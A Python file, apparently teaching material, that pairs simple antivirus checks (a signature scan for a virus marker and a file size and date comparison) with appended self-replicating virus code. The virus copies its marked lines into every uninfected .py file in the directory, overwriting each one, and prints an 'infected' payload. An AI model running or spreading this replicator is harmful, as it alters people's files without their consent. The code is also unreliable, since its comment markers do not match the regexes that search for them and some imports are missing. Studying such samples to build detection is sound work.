# Signature scan
# Scan for signatures just like semantic or other virus software
def checkForSignatures():
    print("#### Checking for virus signatures #####")
    # Get all programs in the directory
    programs = glob.glob("*.py")
    for p in programs:
        thisFileInfected = False
        file = open(p, "r")
        lines = file.readlines()
        file.close()
        for line in lines:
            if re.search("^#starting virus code", line):
                # Found Virus
                print("\n!!!! Virus found in file " + p)
                thisFileInfected = True
        if not thisFileInfected:
            print(p + " has no virus")
        print("#### End section ####\n")

# Heuristic scan
def getFileData():
    # Get an initial scan of file size and data modified. Save
    programs = glob.glob("*.py")
    programList = []
    for p in programs:
        programSize = os.path.getsize(p)
        programModified = os.path.getmtime(p)
        programData = [p, programSize, programModified]
        programList.append(programData)
    return programList

def WriteFileData(programs):
    if os.path.exists("fileData.txt"):
        return
    with open("fileData.txt", "w") as file:
        wr = csv.writer(file)
        wr.writerows(programs)

def checkForChanges():
    print("\n\n###### Check for heuristic changes in files ######")
    # Open the fileData.txt file and compare each line
    # to the current file size and dates
    with open("fileData.txt") as file:
        fileList = file.read().splitlines()
    orginalFileList = []
    for each in fileList:
        items = each.split(',')
        orginalFileList.append(items)
    # Get current data from directory
    currentFileList = getFileData()
    # Compare old and new
    for c in currentFileList:
        for o in orginalFileList:
            if c[0] == o[0]:  # Filename matched
                if str(c[1]) != str(o[1]) or str(c[2]) != str(o[2]):
                    # File size or date don't match
                    print("\nAlert!!! File mismatch")
                    # Print data of each file
                    print("Current values= " + str(c))
                    print("Orginal values= " + str(o))
                else:
                    print("File " + c[0] + " appears to be unchanged")
    print("##### Finished checking for changes #######")

# Starting virus code
import sys, re, glob

# Put a copy of all these lines into a list
virusCode = []

# Open this file and read all lines
# Filter out all lines that are not inside the virus code boundary
thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

# Save the lines into a list to use later
inVirus = False
for line in lines:
    if re.search("^#starting virus code", line):
        inVirus = True
    # If the virus code has been found, start appending the
    # lines to the virusCode list. We assume that the virus
    # code is always appended to the end of the script.
    if inVirus:
        virusCode.append(line)
    if re.search("^#end of virus code", line):
        break

# Find potential victims
programs = glob.glob("*.py")

# Check and infect all programs that glob found
for p in programs:
    file = open(p, "r")
    programCode = file.readlines()
    file.close()
    # Check if the file is already infected
    infected = False
    for line in programCode:
        if re.search("^#starting virus code", line):
            infected = True
            break
    # No need to infect it again.
    if not infected:
        newCode = []
        # NewVersion = current version + virus code
        newCode = programCode
        newCode.extend(virusCode)
        # New version of file. Overwrite the original
        file = open(p, "w")
        file.writelines(newCode)
        file.close()

# Payload - Print file is infected
print("This file is infected")

# End of virus code
